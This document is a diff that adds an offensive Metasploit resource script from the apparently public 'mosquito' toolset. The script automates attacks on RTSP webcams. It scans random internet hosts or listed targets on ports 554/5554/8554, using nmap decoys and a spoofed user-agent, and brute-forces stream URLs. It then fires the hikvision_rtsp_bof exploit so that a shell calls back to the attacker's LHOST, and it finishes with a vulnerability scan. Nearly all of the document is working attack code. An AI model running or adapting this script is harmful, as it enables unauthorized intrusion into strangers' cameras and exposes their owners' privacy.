@@ -1,0 +1,228 @@
+##
+# Script: rtsp-url-brute.rc (webcam's)
+# Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+# GitHub: https://github.com/r00t-3xp10it/resource_files
+# -
+# [OPTIONS]
+# setg SAVE_DB true - Save workspace mosquito to database.xml
+# setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
+# setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
+# setg RHOSTS 201.203.27.251 159.121.101.207 - To instruct db_nmap to scan hosts for ports open.
+# -
+# [SYNTAX EXAMPLES]
+# msf5 > setg RANDOM_HOSTS true;resource /root/rtsp-url-brute.rc'
+# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/rtsp-url-brute.rc'
+##
+  <ruby>
+      run_single("workspace -a mosquito")
+      help = %Q|
+                                                🦟__________       
+              _______🦟________________________  ___(_) _  /______🦟
+           __  __  __ \\  __ \\_  ___/  __  /  / / /_  /_  __/  __ \\
+         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           /_/ /_/ /_/\\____//____/ \\__, / \\__,_/ /_/  \\__/ \\____/
+                                  🦟 /_/                       🦟
+
+    Script: rtsp-url-brute.rc
+    Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+    GitHub: https://github.com/r00t-3xp10it/resource_files
+
+      |
+      print_line(help)
+      Rex::sleep(1.5)
+
+      ## Make sure we are connected to db
+      unless framework.db.active
+        File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+        print_error("[ERROR] Database not connected to postgresql.")
+        print_warning("[execute] service postgresql start")
+        run_single("exit")
+        return nil
+      else
+        print_good("Database connected to postgresql.")
+        Rex::sleep(0.5)
+        local = Dir.pwd
+        work_name = framework.db.workspace.name
+        print_status("Working in workspace: *#{work_name}")
+        Rex::sleep(1.0)
+        ip_range = File.read("ip_range.txt") if File.exist?("ip_range.txt")
+      end
+
+      ## Sellect the type of nmap scan to use
+      if (framework.datastore['RANDOM_HOSTS'] == "true")
+         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
+           run_single("setg LIMMIT 300")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
+         else
+           print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
+         end
+      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+         run_single("setg RHOSTS #{ip_range}.0/24")
+      elsif (framework.datastore['RHOSTS'])
+         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
+      end
+
+      ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
+      # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
+      if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 554,5554,8554 --open --script=banner.nse,rtsp-methods.nse,rtsp-url-brute.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+      elsif (framework.datastore['RANDOM_HOSTS'] == "true")
+         print_status("Nmap: search for random remote hosts with ports 554:5554:8554 open")
+         run_single("db_nmap -sS -vvv -Pn -T4 -iR #{framework.datastore['LIMMIT']} -p 554,5554,8554 --open --script=banner.nse,banner.nse,rtsp-methods.nse,rtsp-url-brute.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
+      else
+         run_single("db_nmap -sS -v -Pn -T4 -O -p 554,5554,8554 --open --script=banner.nse,banner.nse,rtsp-methods.nse,rtsp-url-brute.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
+      end
+
+      if File.directory?("#{local}/logs")
+         run_single("spool #{local}/logs/rtsp-url-brute.log")
+      end
+      print_line("")
+      run_single("services")
+      ## Read the database 
+      print_good("Sellecting target hosts from msf database.")
+      xhost = framework.db.hosts.map(&:address).join(' ')
+      xport = framework.db.services.map(&:port).join(' ')
+      proto = framework.db.services.map(&:proto).join(' ')
+      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
+      run_single("setg RHOSTS #{xhost}")
+      Rex::sleep(2.0)
+
+         ## Make sure that exists hosts/ports (open) in database
+         if xhost.nil? or xhost == '' or xhost == ' '
+              File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+              print_error("[ERROR] db_nmap scan did not find any alive connections.")
+              print_error("please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unsetg all")
+              run_single("workspace -d mosquito")
+              return nil
+         elsif xport.nil? or xport == '' or xport == ' '
+              File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+              print_error("[ERROR] db_nmap did not find any 554,5554,8554 open ports.")
+              print_error("please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unsetg all")
+              run_single("workspace -d mosquito")
+              return nil
+         end
+
+      ## Make sure that freevulnseach.nse exists
+      Rex::sleep(2.0)
+      nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
+      unless (File.exist?(nse))
+           print_error("[ERROR] freevulnsearch.nse/vulners.nse script(s) not found in nmap db.")
+           print_error("[ERROR] Download nse script(s) and install it before running this rc file.")
+           Rex::sleep(1.0)
+           nof = %Q|
+
+    How To Fix
+    ----------
+    Exit current session and msfconsole < exit AND exit -y >
+    Then execute the follow commands in a new terminal windows:
+
+    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
+    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
+
+    sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
+    sudo cp vulners.nse /usr/share/nmap/scripts/vulners.nse
+    sudo nmap --script-updatedb
+
+           |
+           print_line(nof)
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           run_single("unsetg all")
+           run_single("workspace -d mosquito")
+           File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+           return nil
+      else
+           print_good("freevulnsearch.nse/vulners.nse script(s) found.")
+      end
+
+
+         ## Make sure we have LHOST option set
+         if (framework.datastore['LHOST'] == nil or framework.datastore['LHOST'] == '')
+         print_error("[ERROR] LHOST option not set.")
+         Rex::sleep(2.0)
+           err = %Q|
+
+    Remark
+    ------
+    This resource script requires LHOST option set to be abble
+    to send a payload to target hosts to spawn a session back.
+
+    Set your local host (LHOST)
+    ---------------------------
+    [execute] setg LHOST 192.168.1.71
+    [execute] resource ms17_010.rc
+
+           |
+           print_line(err)
+           run_single("unset all")
+           run_single("unsetg all")
+           run_single("workspace -d mosquito")
+           File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+           return nil
+         else
+            local_ip = "#{framework.datastore['LHOST']}"
+         end
+
+         ## Run gather/brute-force modules
+         if xport =~ /(554|5554|8554)/ or proto =~ /(rtsp|rtsp-alt)/i
+              print_warning("Remote Target port: 554:5554:8554 rtsp found")
+              Rex::sleep(1.0)
+              run_single("use exploit/linux/misc/hikvision_rtsp_bof")
+              run_single("set CHOST #{local_ip}")
+              run_single("set VERBOSE true")
+              print_line("")
+              run_single("services -c name -S rtsp -R")
+              run_single("exploit")
+         end
+
+         ## Running freevulnsearch.nse (scan for CVE's)
+         print "[?] Scan for possible CVE's? (y/n): "
+            question = gets.chomp
+
+         if question == "y" or question == "Y"
+            displ = %Q|
+
+         MMMMMMMMMMM'""""'YMMM  MM""MMMMM""MM  MM""""""""`MMMMMMMMMM
+         MMMMMMMMMM' .mmm. `MM  MM  MMMMM  MM  MM  mmmmmmmMMMMMMMMMM
+         MMMMMMMMMM  MMMMMooMM  MM  MMMMP  MM  MM`      MMMMMMMMMMMM 
+         MMMMMMMMMM  MMMMMMMMM  MM  MMMM' .MM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMM. `MMM' .MM  MM  MMP' .MMM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMMM.     .dMM  MM     .dMMMM  MM        .MMMMMMd@bM 
+         MMMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMMM
+                    freevulnsearch.nse by: Mathias Gut
+                         vulners.nse by: gmedian
+
+            |
+            print_line(displ)
+            print_warning("Running CVE checks againts: #{framework.datastore['RHOSTS']}")
+            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse,vulners.nse #{framework.datastore['RHOSTS']}")
+         end
+
+      ## Save current database to local file (database.xml)
+      if (framework.datastore['SAVE_DB'] == "true")
+         rand = Rex::Text.rand_text_alpha(5)
+         print_warning("Exporting database to: #{local}/logs/database_#{rand}.xml")
+         run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
+      end
+
+      ## Cleaning database and unset global variables
+      print_warning("Please wait, Cleaning global variables.")
+      Rex::sleep(1.5)
+      run_single("unsetg all")
+      run_single("unset all")
+      run_single("workspace -d mosquito")
+
+      dtr = `date`
+      ## Writting ['xhost(s)'] to mosquito logfile
+      if File.directory?("#{local}/logs")
+         print_warning("Logfile stored under: #{local}/logs/rtsp-url-brute.log")
+         run_single("echo \"[#{dtr}] rtsp-url-brute: #{xhost}\" >> logs/mosquito.log")
+      end
+      File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+      run_single("back")
+   </ruby>
